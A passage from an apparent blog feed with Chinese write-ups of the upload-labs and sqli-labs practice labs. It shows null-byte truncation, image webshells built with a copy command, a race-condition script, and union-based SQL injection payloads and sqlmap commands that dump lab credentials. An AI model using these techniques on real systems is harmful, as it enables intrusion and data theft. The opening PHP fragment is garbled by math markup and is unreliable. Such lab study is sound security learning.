class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.32833099999999993em;\"><span style=\"top:-2.5500000000000003em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">G</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord mathnormal\" style=\"margin-right:0.05764em;\">E</span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">T</span><span class=\"mopen\"><span class=\"mopen\">[</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.751892em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">′</span></span></span></span></span></span></span></span></span><span class=\"mord mathnormal\">s</span><span class=\"mord mathnormal\">a</span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">v</span><span class=\"mord\"><span class=\"mord mathnormal\">e</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15139200000000003em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">p</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.286108em;\"><span></span></span></span></span></span></span><span class=\"mord mathnormal\">a</span><span class=\"mord mathnormal\">t</span><span class=\"mord\"><span class=\"mord mathnormal\">h</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.751892em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">′</span></span></span></span></span></span></span></span></span><span class=\"mclose\">]</span><span class=\"mord\">.</span><span class=\"mord\">&quot;</span><span class=\"mord\">/</span><span class=\"mord\">&quot;</span><span class=\"mord\">.</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"mord mathnormal\">a</span><span class=\"mord mathnormal\">n</span><span class=\"mord mathnormal\">d</span><span class=\"mopen\">(</span><span class=\"mord\">1</span><span class=\"mord\">0</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\">9</span><span class=\"mord\">9</span><span class=\"mclose\">)</span><span class=\"mord\">.</span><span class=\"mord mathnormal\">d</span><span class=\"mord mathnormal\">a</span><span class=\"mord mathnormal\">t</span><span class=\"mord mathnormal\">e</span><span class=\"mopen\">(</span><span class=\"mord\">&quot;</span><span class=\"mord mathnormal\" style=\"margin-right:0.22222em;\">Y</span><span class=\"mord mathnormal\">m</span><span class=\"mord mathnormal\">d</span><span class=\"mord mathnormal\" style=\"margin-right:0.08125em;\">H</span><span class=\"mord mathnormal\">i</span><span class=\"mord mathnormal\">s</span><span class=\"mord\">&quot;</span><span class=\"mclose\">)</span><span class=\"mord\">.</span><span class=\"mord\">&quot;</span><span class=\"mord\">.</span><span class=\"mord\">&quot;</span><span class=\"mord\">.</span></span></span></span>file_ext;</p>\n<p>用 00 截断，在路径后面加上 hqxx.php%00</p>\n<p><img src=\"upload-labs-11-01.png\" alt=\"\"></p>\n<h2 id=\"总结-11\"><a class=\"markdownIt-Anchor\" href=\"#总结-11\">#</a> 总结</h2>\n<p>通过字符拼接，连接路径文件名，后台处理后上传到 windows 时，os 看见 %00 自动截断</p>\n<p>00 截断的前提条件：PHP 版本小于 5.3.4，PHP 的 magic_quotes_gpc 为 OFF 状态</p>\n<p>move_uploaded_file 函数的底层实现类似于 C 语言，遇到 0x00 会截断</p>\n<h1 id=\"pass-12\"><a class=\"markdownIt-Anchor\" href=\"#pass-12\">#</a> Pass-12</h1>\n<h2 id=\"过程-12\"><a class=\"markdownIt-Anchor\" href=\"#过程-12\">#</a> 过程</h2>\n<p>上传文件抓包，发现路径也在表单中了，在后面加上 /hqxx.php ，注意后面有一个空格</p>\n<p><img src=\"upload-labs-12-01.png\" alt=\"\"></p>\n<p>因为 post 请求没办法解析 %00，所以我们在 hex 中更改数据包</p>\n<p>找到对应行，代表空格的 20，改为 00</p>\n<p><img src=\"upload-labs-12-02.png\" alt=\"\"></p>\n<p>上传成功</p>\n<p><img src=\"upload-labs-12-03.png\" alt=\"\"></p>\n<h2 id=\"总结-12\"><a class=\"markdownIt-Anchor\" href=\"#总结-12\">#</a> 总结</h2>\n<p>为啥网上有人说这是二进制代码，可是这明明不是二进制啊</p>\n<p>通常 JPEG/JPG: FF D8 , PNG:89 50，GIF:47 49</p>\n<ol>\n<li>JPEG;.JPE;.JPG，”JPGGraphic File”</li>\n<li>gif，”GIF 89A”</li>\n<li>zip，”Zip Compressed”</li>\n<li>doc;.xls;.xlt;.ppt;.apr，”MS Compound Document v1 or Lotus Approach APRfile”</li>\n</ol>\n<h1 id=\"pass-13\"><a class=\"markdownIt-Anchor\" href=\"#pass-13\">#</a> Pass-13</h1>\n<h2 id=\"过程-13\"><a class=\"markdownIt-Anchor\" href=\"#过程-13\">#</a> 过程</h2>\n<p>源代码中读取文件前 2 字节，来判断文件类型是否属于 jpg、png 或者 gif 类型</p>\n<p>类型判断成功后，还更改了文件名</p>\n<p><img src=\"upload-labs-13-01.png\" alt=\"\"></p>\n<p>这里用文件包含来解析图片马</p>\n<p>手动在 upload 文件夹添加一个文件包含的 php</p>\n<p><img src=\"upload-labs-13-02.png\" alt=\"\"></p>\n<p>然后浏览器解析</p>\n<p><img src=\"upload-labs-13-03.png\" alt=\"\"></p>\n<h2 id=\"总结-13\"><a class=\"markdownIt-Anchor\" href=\"#总结-13\">#</a> 总结</h2>\n<p>unpack () 函数从二进制字符串对数据进行解包。</p>\n<p>也就是说本身没有文件包含漏洞的话这个图片马是没有办法解析的，唉</p>\n<h1 id=\"pass-14\"><a class=\"markdownIt-Anchor\" href=\"#pass-14\">#</a> Pass-14</h1>\n<h2 id=\"过程-14\"><a class=\"markdownIt-Anchor\" href=\"#过程-14\">#</a> 过程</h2>\n<p>看源码，换了一种方式验证类型</p>\n<p>getimagesize () 这个函数功能会对目标文件的 16 进制去进行一个读取，去读取头几个字符串是不是符合图片的要求的</p>\n<p>所以还是伪造一个头部信息，上传图片马</p>\n<p><img src=\"upload-labs-14-01.png\" alt=\"\"></p>\n<p>图片马的利用可以结合文件包含，解析漏洞等… 反正就是要把他用 php 解析嘛</p>\n<p>比如，<a href=\"https://www.cnblogs.com/renhaoblog/p/12874603.html\">nginx 解析漏洞</a>，和版本无关，属于用户配置不当产生的</p>\n<h2 id=\"总结-14\"><a class=\"markdownIt-Anchor\" href=\"#总结-14\">#</a> 总结</h2>\n<p><a href=\"https://www.runoob.com/php/php-getimagesize.html\">菜鸟教程</a></p>\n<p>getimagesize () 函数用于获取图像大小及相关信息，成功返回一个数组，失败则返回 FALSE 并产生一条 E_WARNING 级的错误信息。</p>\n<p>实例 1：本地图片文件</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">list($width, $height, $type, $attr) = getimagesize(&quot;runoob-logo.png&quot;);</span><br><span class=\"line\">echo &quot;宽度为：&quot; . $width;</span><br><span class=\"line\">echo &quot;高度为：&quot; . $height;</span><br><span class=\"line\">echo &quot;类型为：&quot; . $attr;</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n<p>以上实例输出结果为：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">宽度为：290高度为：69类型为：3属性：width=&quot;290&quot; height=&quot;69&quot;</span><br></pre></td></tr></table></figure>\n<p>实例 2：远程图片文件</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php$remote_png_url = &#x27;http://www.runoob.com/wp-content/themes/w3cschool.cc/assets/img/logo-domain-green2.png&#x27;;$img_data = getimagesize($remote_png_url);print_r($img_data );?&gt;</span><br></pre></td></tr></table></figure>\n<p>以上实例输出结果为：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Array(    [0] =&gt; 290    [1] =&gt; 69    [2] =&gt; 3    [3] =&gt; width=&quot;290&quot; height=&quot;69&quot;    [bits] =&gt; 8    [mime] =&gt; image/png)</span><br></pre></td></tr></table></figure>\n<p>返回结果说明</p>\n<ul>\n<li>索引 0 给出的是图像宽度的像素值</li>\n<li>索引 1 给出的是图像高度的像素值</li>\n<li>索引 2 给出的是图像的类型，返回的是数字，其中 1 = GIF，2 = JPG，3 = PNG，4 = SWF，5 = PSD，6 =  BMP，7 = TIFF (intel byte order)，8 = TIFF (motorola byte order)，9 = JPC，10 = JP2，11 = JPX，12 = JB2，13 = SWC，14 = IFF，15 = WBMP，16 = XBM</li>\n<li>索引 3 给出的是一个宽度和高度的字符串，可以直接用于 HTML 的 <image> 标签</li>\n<li>索引 bits 给出的是图像的每种颜色的位数，二进制格式</li>\n<li>索引 channels 给出的是图像的通道值，RGB 图像默认是 3</li>\n<li>索引 mime 给出的是图像的 MIME 信息，此信息可以用来在 HTTP Content-type 头信息中发送正确的信息，如： header (“Content-type: image/jpeg”);</li>\n</ul>\n<h1 id=\"pass-15\"><a class=\"markdownIt-Anchor\" href=\"#pass-15\">#</a> Pass-15</h1>\n<h2 id=\"过程-15\"><a class=\"markdownIt-Anchor\" href=\"#过程-15\">#</a> 过程</h2>\n<p>使用 exif_imagetype () 检查是否为图片文件</p>\n<p>用图片马进行绕过</p>\n<p><img src=\"upload-labs-15-01.png\" alt=\"\"></p>\n<p>但是还得帮 php 安装 exif.so 扩展库</p>\n<p><img src=\"upload-labs-15-02.png\" alt=\"\"></p>\n<p>上传成功</p>\n<p><img src=\"upload-labs-15-03.png\" alt=\"\"></p>\n<h2 id=\"总结-15\"><a class=\"markdownIt-Anchor\" href=\"#总结-15\">#</a> 总结</h2>\n<p>exif_imagetype ( string $filename ) : int <em>exif_imagetype()</em> 读取一个图像的第一个字节并检查其签名。</p>\n<h1 id=\"pass-16\"><a class=\"markdownIt-Anchor\" href=\"#pass-16\">#</a> Pass-16</h1>\n<h2 id=\"过程-16\"><a class=\"markdownIt-Anchor\" href=\"#过程-16\">#</a> 过程</h2>\n<p>看源码，判断了后缀，然后利用 imagecreatefrompng () 等函数创建图片，同时也利用这个函数判断图片类型是否一致了，然后再重命名文件</p>\n<p>依然用图片马绕过，但是简单的在文件前加入 GIF89a 已经不可</p>\n<p>那就把图片和木马合在一起叭，cmd 执行以下命令</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">copy pig.jpg/b +  a.php/a haha.jpg</span><br></pre></td></tr></table></figure>\n<p>再上传 haha.jpg</p>\n<p><img src=\"upload-labs-16-01.png\" alt=\"\"></p>\n<p>往下翻可以看到木马被插在了图片的中间</p>\n<h2 id=\"总结-16\"><a class=\"markdownIt-Anchor\" href=\"#总结-16\">#</a> 总结</h2>\n<p>过过过</p>\n<h1 id=\"pass-17\"><a class=\"markdownIt-Anchor\" href=\"#pass-17\">#</a> Pass-17</h1>\n<h2 id=\"过程-17\"><a class=\"markdownIt-Anchor\" href=\"#过程-17\">#</a> 过程</h2>\n<p>看源码，是先上传文件移动到 upload 文件夹后，再对后缀进行判断，判断允许后重命名文件再删除原来的文件，否则直接删除文件</p>\n<p>那就搞文件竞争，在上传文件和删除文件之间的时间，进行访问上传的文件，并且通过上传的文件创建新的木马</p>\n<p>利用 py 脚本不断访问上传的 haha.php</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requestswhile <span class=\"literal\">True</span>:    requests.get(<span class=\"string\">&#x27;http://www.upload-labs.com/upload-labs/upload/haha.php&#x27;</span>)</span><br></pre></td></tr></table></figure>\n<p><a href=\"http://xn--request-fy3l308svi7bxjr.py\">然后运行 request.py</a></p>\n<p>然后不断点击发包</p>\n<p><img src=\"upload-labs-17-02.png\" alt=\"\"></p>\n<p>上传成功</p>\n<p><img src=\"upload-labs-17-01.png\" alt=\"\"></p>\n<p><img src=\"upload-labs-17-03.png\" alt=\"\"></p>\n<h2 id=\"总结-17\"><a class=\"markdownIt-Anchor\" href=\"#总结-17\">#</a> 总结</h2>\n<p>抄作业的感觉，唉</p>\n<h1 id=\"pass-18\"><a class=\"markdownIt-Anchor\" href=\"#pass-18\">#</a> Pass-18</h1>\n<h2 id=\"过程-18\"><a class=\"markdownIt-Anchor\" href=\"#过程-18\">#</a> 过程</h2>\n<p>源代码中，先检查了后缀，大小等等，再上传，再重命名</p>\n<p>它检查后缀用的白名单，所以试一下截断➕竞争</p>\n<p>想法很美好，现实很骨感，看报错信息，是卡在文件名后缀上了</p>\n<p><img src=\"upload-labs-18-01.png\" alt=\"\"></p>\n<p>所以直接和之前一样上传图片马哈哈哈</p>\n<p><img src=\"upload-labs-18-02.png\" alt=\"\"></p>\n<p>再用文件包含之类的配合…</p>\n<h2 id=\"总结-18\"><a class=\"markdownIt-Anchor\" href=\"#总结-18\">#</a> 总结</h2>\n<p>世上无难事只要肯放弃</p>\n<p>值得注意的是这里也可以将 php 文件后缀名更改为.php.7z，因为白名单中允许上传.7z 的文件，但是 apache 又不能解析这个格式，所以会把该文件当 php 的格式解析</p>\n<h1 id=\"pass-19\"><a class=\"markdownIt-Anchor\" href=\"#pass-19\">#</a> Pass-19</h1>\n<h2 id=\"过程-19\"><a class=\"markdownIt-Anchor\" href=\"#过程-19\">#</a> 过程</h2>\n<p>可以自定义名称</p>\n<p>上传 a.php</p>\n<p>自定义名称 haha.php.</p>\n<p>因为用的黑名单，上传成功</p>\n<p><img src=\"upload-labs-19-01.png\" alt=\"\"></p>\n<p>大小写都能绕哈哈哈</p>\n<h2 id=\"总结-19\"><a class=\"markdownIt-Anchor\" href=\"#总结-19\">#</a> 总结</h2>\n<p>哈哈哈</p>\n",
            "tags": [
                "文件上传靶场"
            ]
        },
        {
            "id": "http://example.com/2020/11/16/dmx/sqli-labs%E5%9F%BA%E7%A1%80%E5%85%B3%E5%8D%A1/",
            "url": "http://example.com/2020/11/16/dmx/sqli-labs%E5%9F%BA%E7%A1%80%E5%85%B3%E5%8D%A1/",
            "title": "sqli-labs基础关卡",
            "date_published": "2020-11-16T13:29:27.000Z",
            "content_html": "<h1 id=\"less-1\"><a class=\"markdownIt-Anchor\" href=\"#less-1\">#</a> Less-1</h1>\n<p>date:2020-11-16 21:29:27</p>\n<h2 id=\"过程\"><a class=\"markdownIt-Anchor\" href=\"#过程\">#</a> 过程</h2>\n<p>根据题目提示：Please input the ID as parameter with numeric value ，注入点为 id</p>\n<h3 id=\"sqlmap\"><a class=\"markdownIt-Anchor\" href=\"#sqlmap\">#</a> sqlmap：</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">爆库:</span><br><span class=\"line\">py sqlmap.py -u http://www.sqli-labs.com/Less-1?id=1 --dbs --batch</span><br><span class=\"line\">爆表：</span><br><span class=\"line\">py sqlmap.py -u http://www.sqli-labs.com/Less-1?id=1 -D security --tables --batch</span><br><span class=\"line\">爆字段:</span><br><span class=\"line\">py sqlmap.py -u http://www.sqli-labs.com/Less-1?id=1 -D security -T users --columns --batch</span><br><span class=\"line\">爆字段值:</span><br><span class=\"line\">py sqlmap.py -u http://www.sqli-labs.com/Less-1?id=1 -D security -T users -C id,password,username --dump --batch</span><br><span class=\"line\"></span><br><span class=\"line\">拿到数据，别的表同理：</span><br><span class=\"line\">Database: security</span><br><span class=\"line\">Table: users</span><br><span class=\"line\">[13 entries]</span><br><span class=\"line\">+----+------------+----------+</span><br><span class=\"line\">| id | password   | username |</span><br><span class=\"line\">+----+------------+----------+</span><br><span class=\"line\">| 1  | Dumb       | Dumb     |</span><br><span class=\"line\">| 2  | I-kill-you | Angelina |</span><br><span class=\"line\">| 3  | p@ssword   | Dummy    |</span><br><span class=\"line\">| 4  | crappy     | secure   |</span><br><span class=\"line\">| 5  | stupidity  | stupid   |</span><br><span class=\"line\">| 6  | genious    | superman |</span><br><span class=\"line\">| 7  | mob!le     | batman   |</span><br><span class=\"line\">| 8  | admin      | admin    |</span><br><span class=\"line\">| 9  | admin1     | admin1   |</span><br><span class=\"line\">| 10 | admin2     | admin2   |</span><br><span class=\"line\">| 11 | admin3     | admin3   |</span><br><span class=\"line\">| 12 | dumbo      | dhakkan  |</span><br><span class=\"line\">| 14 | admin4     | admin4   |</span><br><span class=\"line\">+----+------------+----------+</span><br></pre></td></tr></table></figure>\n<h3 id=\"手工注入\"><a class=\"markdownIt-Anchor\" href=\"#手工注入\">#</a> 手工注入：</h3>\n<p>先小心翼翼地试一个 id=1</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://www.sqli-labs.com/Less-1/</span><br><span class=\"line\">?id=1</span><br></pre></td></tr></table></figure>\n<p>哦豁，有数据回显</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Your Login name:Dumb</span><br><span class=\"line\">Your Password:Dumb</span><br></pre></td></tr></table></figure>\n<p>用 orderby 试一下要几个字段，但是发现随便 oderby 都是一样的回显…</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://www.sqli-labs.com/Less-1/</span><br><span class=\"line\">?id=2 order by 110</span><br></pre></td></tr></table></figure>\n<p>中间试了好多都没有给回应，加单引号报错看一下 sql 语句，先入为主以为是数字型的了，明明题目也写了… 蠢爆了！！！</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://www.sqli-labs.com/Less-1/</span><br><span class=\"line\">?id=1&#x27;</span><br><span class=\"line\">输出：</span><br><span class=\"line\">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;&#x27;1&#x27;&#x27; LIMIT 0,1&#x27; at line 1</span><br></pre></td></tr></table></figure>\n<p>orderby 试出来是要三个字段，因为要闭合后面的单引号好麻烦就直接用 #（URL 编码 %23）注释了后面的代码，自己搞</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://www.sqli-labs.com/Less-1/</span><br><span class=\"line\">?id=1&#x27; order by 3 limit 1 %23</span><br><span class=\"line\">输出：</span><br><span class=\"line\">Your Login name:Dumb</span><br><span class=\"line\">Your Password:Dumb</span><br><span class=\"line\"></span><br><span class=\"line\">http://www.sqli-labs.com/Less-1/</span><br><span class=\"line\">?id=1&#x27; order by 4 limit 1 %23</span><br><span class=\"line\">输出：</span><br><span class=\"line\">Unknown column &#x27;4&#x27; in &#x27;order clause&#x27;</span><br></pre></td></tr></table></figure>\n<p>三个字段，只输出了两个值，理所当然有一个 id 啦，所以第一个字段随便搞，后面两个字段用了输出我们要的数据，一套流程走</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">爆库，从mysql默认的数据库information_schema里找所有的数据，使用group_concat拼接：</span><br><span class=\"line\">http://www.sqli-labs.com/Less-1/</span><br><span class=\"line\">?id=666666&#x27; union select 1,database(),group_concat(schema_name) from information_schema.schemata %23</span><br><span class=\"line\">输出：</span><br><span class=\"line\">第二个字段是当前数据库security，第三个字段是输出localhost所有的数据库</span><br><span class=\"line\"></span><br><span class=\"line\">爆表：</span><br><span class=\"line\">http://www.sqli-labs.com/Less-1/</span><br><span class=\"line\">?id=666666&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where database()=table_schema %23</span><br><span class=\"line\">输出：</span><br><span class=\"line\">Your Login name:emails,referers,uagents,users</span><br><span class=\"line\">Your Password:3</span><br><span class=\"line\"></span><br><span class=\"line\">爆字段：</span><br><span class=\"line\">http://www.sqli-labs.com/Less-1/</span><br><span class=\"line\">?id=666666&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;users&#x27; %23</span><br><span class=\"line\">输出：</span><br><span class=\"line\">Your Login name:user_id,first_name,last_name,user,password,avatar,last_login,failed_login,id,username,password,level,id,username,password</span><br><span class=\"line\">Your Password:3</span><br><span class=\"line\"></span><br><span class=\"line\">爆字段值：</span><br><span class=\"line\">http://www.sqli-labs.com/Less-1/</span><br><span class=\"line\">?id=666666&#x27; union select 1,group_concat(concat_ws(&#x27;--&#x27;,id,username,password)),3 from users+%23</span><br><span class=\"line\">输出：</span><br><span class=\"line\">Your Login name:1--Dumb--Dumb,2--Angelina--I-kill-you,3--Dummy--p@ssword,4--secure--crappy,5--stupid--stupidity,6--superman--genious,7--batman--mob!le,8--admin--admin,9--admin1--admin1,10--admin2--admin2,11--admin3--admin3,12--dhakkan--dumbo,14--admin4--admin4</span><br><span class=\"line\">Your Password:3</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h2 id=\"总结\"><a class=\"markdownIt-Anchor\" href=\"#总结\">#</a> 总结</h2>\n<ol>\n<li>虽然我觉得闭合引号很麻烦，但是我就是还是想去试一下，直接在最后闭合就可以了，也不会报语法错</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://www.sqli-labs.com/Less-1/</span><br><span class=\"line\">?id=1&quot; order by 3 &quot;</span><br></pre></td></tr></table></figure>\n<p>​\t\t那为什么大家闭合的时候都喜欢用</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id=1&#x27; and &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>\n<ol start=\"2\">\n<li>\n<p>画面感地理解一下函数</p>\n<p>concat_ws () 是拼接一行的数据</p>\n<p>group_concat () 是拼接一列的数据</p>\n</li>\n<li>\n<p>因为 sql 学的就很菜，有些语法函数什么的还要百度，mysql 里 information_schema 里的，很多表名和字段名经常搞混，手工注入的时候还要去看具体的表名和字段名，超级浪费时间的，可是记一下吧很久不写又忘记了，而且数据库那么多，默认的表都不一样，还是多写题 8</p>\n</li>\n<li>\n<p>跑 sqlmap 的时候，会给出相应的 payload，有些写得真的超级复杂，说是为了绕过把，可是有个 select 就感觉绕不过去呀，等有一天我不再是一个连脚本都不会用的菜鸡了，有机会的话，想去研读一下源码</p>\n</li>\n</ol>\n<hr>\n<h1 id=\"less-2\"><a class=\"markdownIt-Anchor\" href=\"#less-2\">#</a> Less-2</h1>\n<p>data: 2020-11-17 10:32:43</p>\n<h2 id=\"过程-2\"><a class=\"markdownIt-Anchor\" href=\"#过程-2\">#</a> 过程</h2>\n<p>和 less-1 相比就是少闭合了两个引号罢了</p>\n<h3 id=\"sqlmap-2\"><a class=\"markdownIt-Anchor\" href=\"#sqlmap-2\">#</a> sqlmap</h3>\n<p>同 Less-1</p>\n<h3 id=\"手工注入-2\"><a class=\"markdownIt-Anchor\" href=\"#手工注入-2\">#</a> 手工注入</h3>\n<p>判断 id 是注入点且需要三个字段：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">payload:http://www.sqli-labs.com/Less-2?id=1 order by 4输出：Unknown column &#x27;4&#x27; in &#x27;order clause&#x27;payload:http://www.sqli-labs.com/Less-2?id=1 order by 3输出：Your Login name:DumbYour Password:Dumb</span><br></pre></td></tr></table></figure>\n<p>和 less-1 一样一套流程：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">爆库，第二个字段拼接改连接所有数据库名：http://www.sqli-labs.com/Less-2?id=-1 union select 1,group_concat(schema_name),3 from information_schema.schemata爆当前数据库的表：http://www.sqli-labs.com/Less-2?id=-1 union select 1,group_concat(table_name),3 from information_schema.tables where database()=table_schema爆字段：http://www.sqli-labs.com/Less-2?id=-1 union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;users&#x27;爆字段值：http://www.sqli-labs.com/Less-2?id=-1 union select 1,group_concat(concat_ws(&#x27;--&#x27;,username,password)),3 from users</span><br></pre></td></tr></table></figure>\n<h2 id=\"总结-2\"><a class=\"markdownIt-Anchor\" href=\"#总结-2\">#</a> 总结</h2>\n<p>想当年我还是个不管写什么题目都要看通关手册的人，鼓掌！！！</p>\n<hr>\n<h1 id=\"less-3\"><a class=\"markdownIt-Anchor\" href=\"#less-3\">#</a> Less-3</h1>\n<p>date:2020-11-17 11:00:04</p>\n<h2 id=\"过程-3\"><a class=\"markdownIt-Anchor\" href=\"#过程-3\">#</a> 过程</h2>\n<h3 id=\"sqlmap-3\"><a class=\"markdownIt-Anchor\" href=\"#sqlmap-3\">#</a> sqlmap</h3>\n<p>同 Less-1</p>\n<h3 id=\"手工注入-3\"><a class=\"markdownIt-Anchor\" href=\"#手工注入-3\">#</a> 手工注入</h3>\n<p>加单引号报错，看后面具体要闭合啥</p>\n<p>payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://www.sqli-labs.com/Less-3?id=1asdf&#x27;kkkk</span><br></pre></td></tr></table></figure>\n<p>输出，发现后面有括号啥的闭合一下，并且 id 也是字符型的：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;kkkk&#x27;) LIMIT 0,1&#x27; at line 1</span><br></pre></td></tr></table></figure>\n<p>根据 order by 判断需要的字段数是 3 个</p>\n<p>payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://www.sqli-labs.com/Less-3?id=-1&#x27;) order by 4 --+http://www.sqli-labs.com/Less-3?id=-1&#x27;) order by 3 --+</span><br></pre></td></tr></table></figure>\n<p>脱脱脱：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span 